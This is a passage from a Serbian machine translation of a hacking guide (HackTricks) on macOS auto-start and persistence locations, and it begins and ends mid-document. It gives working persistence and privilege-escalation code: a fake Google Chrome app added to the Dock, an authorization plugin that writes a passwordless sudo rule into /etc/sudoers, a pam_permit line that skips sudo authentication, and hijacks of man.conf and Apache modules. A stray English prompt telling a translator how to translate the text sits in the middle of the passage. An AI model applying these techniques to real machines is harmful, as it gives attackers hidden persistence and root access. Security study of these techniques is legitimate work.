MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
Ako AT zadaci nisu omogućeni, kreirani zadaci se neće izvršiti.
{% endhint %}

**Datoteke posla** mogu se pronaći na lokaciji `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Naziv datoteke sadrži red, broj posla i vreme kada je zakazan da se pokrene. Na primer, pogledajmo `a0001a019bdcd2`.

* `a` - ovo je red
* `0001a` - broj posla u heksadecimalnom formatu, `0x1a = 26`
* `019bdcd2` - vreme u heksadecimalnom formatu. Predstavlja minute koje su prošle od epohe. `0x019bdcd2` je `26991826` u decimalnom formatu. Ako ga pomnožimo sa 60 dobijamo `1619509560`, što je `GMT: 27. april 2021, utorak 7:46:00`.

Ako odštampamo datoteku posla, otkrivamo da sadrži iste informacije koje smo dobili koristeći `at -c`.

### Akcije fascikle

Opis: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
Opis: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

* Korisno za zaobilaženje peska: [✅](https://emojipedia.org/check-mark-button)
* Ali morate moći da pozovete `osascript` sa argumentima kako biste kontaktirali **`System Events`** da biste mogli konfigurisati akcije fascikle
* Zaobilaženje TCC-a: [🟠](https://emojipedia.org/large-orange-circle)
* Ima neka osnovna TCC ovlašćenja kao što su Radna površina, Dokumenti i Preuzimanja

#### Lokacija

* **`/Library/Scripts/Folder Action Scripts`**
* Potreban je root pristup
* **Okidač**: Pristup određenoj fascikli
* **`~/Library/Scripts/Folder Action Scripts`**
* **Okidač**: Pristup određenoj fascikli

#### Opis i iskorišćavanje

Akcije fascikle su skripte koje se automatski pokreću prilikom promena u fascikli, kao što su dodavanje, uklanjanje stavki ili druge radnje poput otvaranja ili promene veličine prozora fascikle. Ove akcije se mogu koristiti za različite zadatke i mogu se pokrenuti na različite načine, kao što je korišćenje korisničkog interfejsa Finder-a ili terminalskih komandi.

Da biste postavili akcije fascikle, imate opcije kao što su:

1. Izrada radnog toka akcije fascikle pomoću [Automator-a](https://support.apple.com/guide/automator/welcome/mac) i instaliranje kao servis.
2. Ručno pridruživanje skripte putem Postavki akcija fascikle u kontekstnom meniju fascikle.
3. Korišćenje OSAScript-a za slanje Apple Event poruka aplikaciji `System Events.app` radi programskog postavljanja akcije fascikle.
* Ovaj metod je posebno koristan za ugradnju akcije u sistem i pruža određeni nivo postojanosti.

Sledeći primer skripte prikazuje šta može biti izvršeno pomoću akcije fascikle:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Da biste ovaj skript učinili upotrebljivim za Folder Actions, kompajlirajte ga koristeći:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Nakon što je skripta kompajlirana, postavite Folder Actions izvršavanjem sledeće skripte. Ova skripta će omogućiti globalno Folder Actions i posebno će povezati prethodno kompajliranu skriptu sa Desktop folderom.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
Pokrenite skriptu za podešavanje sa:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
* Ovo je način za implementaciju ove postojanosti putem GUI-a:

Ovo je skripta koja će biti izvršena:

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

Kompajlirajte ga sa: `osacompile -l JavaScript -o folder.scpt source.js`

Premestite ga u:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Zatim otvorite aplikaciju `Folder Actions Setup`, odaberite **folder koji želite pratiti** i odaberite u vašem slučaju **`folder.scpt`** (u mom slučaju sam ga nazvao output2.scp):

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt="" width="297"><figcaption></figcaption></figure>

Sada, ako otvorite taj folder sa **Finderom**, vaš skript će se izvršiti.

Ova konfiguracija je sačuvana u **plist** fajlu koji se nalazi na lokaciji **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** u base64 formatu.

Sada, pokušajmo da pripremimo ovu postojanost bez GUI pristupa:

1. **Kopirajte `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** u `/tmp` da biste ga sačuvali:
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Uklonite** Folder Actions koje ste upravo postavili:

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

Sada kada imamo prazno okruženje

3. Kopirajte rezervnu kopiju fajla: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Otvorite aplikaciju Folder Actions Setup da biste primenili ovu konfiguraciju: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
Ovo nije uspelo kod mene, ali to su uputstva iz writeup-a :(
{% endhint %}

### Prečice u Dock-u

Writeup: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
* Ali morate imati instaliranu zlonamernu aplikaciju unutar sistema
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* `~/Library/Preferences/com.apple.dock.plist`
* **Okidač**: Kada korisnik klikne na aplikaciju u Dock-u

#### Opis & Eksploatacija

Sve aplikacije koje se pojavljuju u Dock-u su navedene u plist-u: **`~/Library/Preferences/com.apple.dock.plist`**

Moguće je **dodati aplikaciju** samo sa:

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

Korišćenjem **socijalnog inženjeringa** možete **predstavljati se kao na primer Google Chrome** unutar dock-a i zapravo izvršiti svoj sopstveni skript:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Birači boja

Opis: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* Korisno za zaobilaženje peska: [🟠](https://emojipedia.org/large-orange-circle)
* Potrebna je vrlo specifična radnja
* Završićete u drugom pesku
* Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* `/Library/ColorPickers`
* Potreban je root pristup
* Okidač: Korišćenje birača boja
* `~/Library/ColorPickers`
* Okidač: Korišćenje birača boja

#### Opis i iskorišćavanje

**Kompajlirajte birač boja** paket sa vašim kodom (možete koristiti [**ovaj na primer**](https://github.com/viktorstrate/color-picker-plus)) i dodajte konstruktor (kao u odeljku o ekranu za čuvanje (macos-auto-start-locations.md#screen-saver)) i kopirajte paket u `~/Library/ColorPickers`.

Zatim, kada se birač boja pokrene, vaš kod će se takođe izvršiti.

Imajte na umu da binarni fajl koji učitava vašu biblioteku ima **vrlo restriktivan pesak**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### Finder Sync Pluginovi

**Opis**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**Opis**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* Korisno za zaobilaženje sandbox-a: **Ne, jer morate izvršiti svoju sopstvenu aplikaciju**
* TCC zaobilaženje: ???

#### Lokacija

* Specifična aplikacija

#### Opis i Exploit

Primer aplikacije sa Finder Sync Extension-om [**može se naći ovde**](https://github.com/D00MFist/InSync).

Aplikacije mogu imati `Finder Sync Extension`. Ova ekstenzija će biti smeštena unutar aplikacije koja će biti izvršena. Osim toga, da bi ekstenzija mogla da izvrši svoj kod, **mora biti potpisana** nekim validnim Apple-ovim sertifikatom za razvoj, mora biti **sandbox-ovana** (mada se mogu dodati opuštena izuzetka) i mora biti registrovana sa nečim poput:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

Writeup: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

* Korisno za zaobilaženje peska: [🟠](https://emojipedia.org/large-orange-circle)
* Ali završićete u zajedničkom pesku aplikacija
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* `/System/Library/Screen Savers`
* Potreban je root
* **Okidač**: Izaberite screensaver
* `/Library/Screen Savers`
* Potreban je root
* **Okidač**: Izaberite screensaver
* `~/Library/Screen Savers`
* **Okidač**: Izaberite screensaver

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>

#### Opis i Exploit

Napravite novi projekat u Xcode-u i izaberite šablon za generisanje novog **Screen Saver**-a. Zatim, dodajte kod u njega, na primer sledeći kod za generisanje logova.

**Build**-ujte ga i kopirajte `.saver` paket u **`~/Library/Screen Savers`**. Zatim, otvorite Screen Saver GUI i ako samo kliknete na njega, trebalo bi da generiše mnogo logova:

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
Napomena da zato što se unutar privilegija binarnog koda koji učitava ovaj kod (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) može pronaći **`com.apple.security.app-sandbox`** bićete **unutar zajedničkog aplikacijskog sandboxa**.
{% endhint %}

Kod za čuvanje ekrana:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight dodaci

writeup: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* Korisno za zaobilaženje peska: [🟠](https://emojipedia.org/large-orange-circle)
* Ali završićete u pesku aplikacije
* Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)
* Pesak izgleda veoma ograničen

#### Lokacija

* `~/Library/Spotlight/`
* **Okidač**: Kreiran je novi fajl sa ekstenzijom koju upravlja spotlight dodatak.
* `/Library/Spotlight/`
* **Okidač**: Kreiran je novi fajl sa ekstenzijom koju upravlja spotlight dodatak.
* Potreban je root pristup
* `/System/Library/Spotlight/`
* **Okidač**: Kreiran je novi fajl sa ekstenzijom koju upravlja spotlight dodatak.
* Potreban je root pristup
* `Some.app/Contents/Library/Spotlight/`
* **Okidač**: Kreiran je novi fajl sa ekstenzijom koju upravlja spotlight dodatak.
* Potrebna je nova aplikacija

#### Opis i iskorišćavanje

Spotlight je ugrađena funkcija pretrage u macOS-u, dizajnirana da korisnicima omogući **brz i sveobuhvatan pristup podacima na njihovim računarima**.\
Da bi olakšala ovu brzu mogućnost pretrage, Spotlight održava **vlastitu bazu podataka** i kreira indeks analizirajući većinu fajlova, omogućavajući brze pretrage kako po imenima fajlova tako i po njihovom sadržaju.

Osnovni mehanizam Spotlight-a uključuje centralni proces nazvan 'mds', što je skraćenica od **'metadata server'**. Ovaj proces upravlja celokupnom Spotlight uslugom. Pored toga, postoje više 'mdworker' demona koji obavljaju razne zadatke održavanja, kao što je indeksiranje različitih tipova fajlova (`ps -ef | grep mdworker`). Ovi zadaci su omogućeni putem dodataka Spotlight uvoznika, ili **".mdimporter paketa**", koji omogućavaju Spotlight-u da razume i indeksira sadržaj u različitim formatima fajlova.

Dodaci ili **`.mdimporter`** paketi se nalaze na prethodno navedenim mestima i ako se pojavi novi paket, on se učitava u roku od nekoliko minuta (nije potrebno ponovno pokretanje bilo koje usluge). Ovi paketi moraju naznačiti koje **tipove fajlova i ekstenzije mogu upravljati**, na taj način će Spotlight koristiti ih kada se kreira novi fajl sa naznačenom ekstenzijom.

Moguće je **pronaći sve `mdimporter`** učitane pokretanjem:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
I na primer, **/Library/Spotlight/iBooksAuthor.mdimporter** se koristi za parsiranje ovih vrsta fajlova (ekstenzije `.iba` i `.book` između ostalih):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
{% hint style="danger" %}
Ako proverite Plist drugog `mdimporter`-a, možda nećete pronaći unos **`UTTypeConformsTo`**. To je zato što je to ugrađeni _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) i ne mora da specificira ekstenzije.

Osim toga, podrazumevani sistemski dodaci uvek imaju prednost, tako da napadač može pristupiti samo datotekama koje nisu indeksirane od strane Apple-ovih `mdimporters`-a.
{% endhint %}

Da biste kreirali sopstveni uvoznik, možete početi sa ovim projektom: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), a zatim promeniti ime, **`CFBundleDocumentTypes`** i dodati **`UTImportedTypeDeclarations`** kako bi podržao ekstenziju koju želite da podržite i reflektovao ih u **`schema.xml`**.\
Zatim **promenite** kod funkcije **`GetMetadataForFile`** da izvrši vaš payload kada se kreira datoteka sa obrađenom ekstenzijom.

Na kraju **izgradite i kopirajte svoj novi `.mdimporter`** na jedno od prethodnih lokacija i možete proveriti kada se učita **praćenjem logova** ili proverom **`mdimport -L.`**

### ~~Preference Pane~~

{% hint style="danger" %}
Izgleda da ovo više ne radi.
{% endhint %}

Objašnjenje: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

* Korisno za zaobilaženje peska: [🟠](https://emojipedia.org/large-orange-circle)
* Potrebna je određena korisnička radnja
* Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### Opis

Izgleda da ovo više ne radi.

## Zaobilaženje peska korisnika

{% hint style="success" %}
Ovde možete pronaći početne lokacije koje su korisne za **zaobilaženje peska** koje vam omogućavaju da jednostavno nešto izvršite tako što to napišete u datoteku kao **root** i/ili zahtevajući druge **čudne uslove**.
{% endhint %}

### Periodično

Objašnjenje: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)

* Korisno za zaobilaženje peska: [🟠](https://emojipedia.org/large-orange-circle)
* Ali morate biti root
* Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
* Potreban je root
* **Okidač**: Kada dođe vreme
* `/etc/daily.local`, `/etc/weekly.local` ili `/etc/monthly.local`
* Potreban je root
* **Okidač**: Kada dođe vreme

#### Opis i iskorišćavanje

Periodični skriptovi (**`/etc/periodic`**) se izvršavaju zbog **launch daemona** konfigurisanih u `/System/Library/LaunchDaemons/com.apple.periodic*`. Imajte na umu da se skripte smeštene u `/etc/periodic/` izvršavaju kao **vlasnik datoteke**, tako da ovo neće raditi za potencijalno podizanje privilegija.

{% code overflow="wrap" %}
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

Postoje i drugi periodični skriptovi koji će se izvršiti, a naznačeni su u **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Ako uspete da napišete bilo koji od fajlova `/etc/daily.local`, `/etc/weekly.local` ili `/etc/monthly.local`, on će biti **izvršen ranije ili kasnije**.

{% hint style="warning" %}
Imajte na umu da će periodični skript biti **izvršen kao vlasnik skripta**. Dakle, ako obični korisnik ima vlasništvo nad skriptom, on će biti izvršen kao taj korisnik (ovo može sprečiti napade na eskalaciju privilegija).
{% endhint %}

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

* Korisno za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
* Ali morate biti root
* Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* Uvek je potreban root

#### Opis i iskorišćavanje

Pošto je PAM više usmeren na **upornost** i malver nego na jednostavno izvršavanje unutar macOS-a, ovaj blog neće pružiti detaljno objašnjenje, **pročitajte writeup-ove da biste bolje razumeli ovu tehniku**.

Proverite PAM module sa:
```bash
ls -l /etc/pam.d
```
Jedna tehnika upornosti/privilegovanog eskaliranja zloupotrebljava PAM i jednostavna je kao modifikacija modula /etc/pam.d/sudo dodavanjem linije na početku:
```bash
auth       sufficient     pam_permit.so
```
The following is content from a hacking book about hacking techniques. The following content is from the file /hive/hacktricks/macos-hardening/macos-auto-start-locations.md. Translate the relevant English text to Serbian and return the translation keeping exactly the same markdown and HTML syntax. Do not translate things like code, hacking technique names, hacking word, cloud/SaaS platform names (like Workspace, aws, gcp...), the word 'leak', pentesting, and markdown tags. Also don't add any extra stuff apart from the translation and markdown syntax.
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
I stoga će svaki pokušaj korišćenja **`sudo` komande raditi**.

{% hint style="danger" %}
Napomena da je ovaj direktorijum zaštićen od strane TCC-a, pa je vrlo verovatno da će korisnik dobiti upit za pristup.
{% endhint %}

### Pluginovi za autorizaciju

Objašnjenje: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
Objašnjenje: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* Korisno za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
* Ali morate biti root i napraviti dodatne konfiguracije
* Zaobilaženje TCC-a: ???

#### Lokacija

* `/Library/Security/SecurityAgentPlugins/`
* Potreban je root pristup
* Takođe je potrebno konfigurisati bazu podataka za autorizaciju da koristi plugin

#### Opis i iskorišćavanje

Možete kreirati plugin za autorizaciju koji će se izvršiti prilikom prijavljivanja korisnika kako bi održao postojanost. Za više informacija o tome kako kreirati jedan od ovih pluginova, pogledajte prethodna objašnjenja (i budite oprezni, loše napisan plugin može vas zaključati i moraćete očistiti svoj Mac iz režima oporavka).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Premestite** paket na lokaciju koja će biti učitana:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Na kraju dodajte **pravilo** za učitavanje ovog dodatka:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** će obavestiti okvir za autorizaciju da će mu biti potrebno **pozvati spoljni mehanizam za autorizaciju**. Osim toga, **`privileged`** će ga izvršiti kao root korisnik.

Pokreni ga sa:
```bash
security authorize com.asdf.asdf
```
I onda **grupa osoblja treba imati sudo** pristup (pročitajte `/etc/sudoers` da biste potvrdili).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* Korisno za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
* Ali morate biti root i korisnik mora koristiti man
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* **`/private/etc/man.conf`**
* Potreban je root
* **`/private/etc/man.conf`**: Svaki put kada se koristi man

#### Opis i Exploit

Konfiguraciona datoteka **`/private/etc/man.conf`** ukazuje na binarni / skriptu koju treba koristiti prilikom otvaranja man dokumentacionih datoteka. Dakle, putanja do izvršne datoteke može se izmeniti tako da se svaki put kada korisnik koristi man za čitanje nekih dokumenata izvrši zadnja vrata.

Na primer, postavite u **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
I zatim kreirajte `/tmp/view` kao:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* Korisno za zaobilaženje peska: [🟠](https://emojipedia.org/large-orange-circle)
* Ali morate biti root i apache mora biti pokrenut
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)
* Httpd nema privilegije

#### Lokacija

* **`/etc/apache2/httpd.conf`**
* Potreban je root pristup
* Okidač: Kada se pokrene Apache2

#### Opis i Exploit

Možete naznačiti u `/etc/apache2/httpd.conf` da se učita modul dodavanjem linije kao što je: 

{% code overflow="wrap" %}
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

Na ovaj način će vaši kompajlirani moduli biti učitani od strane Apache servera. Jedina stvar je da ili morate **potpisati ih sa validnim Apple sertifikatom**, ili morate **dodati novi pouzdani sertifikat** u sistem i **potpisati ih** sa njim.

Zatim, ako je potrebno, da biste bili sigurni da će server biti pokrenut, možete izvršiti:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Kôd primer za Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

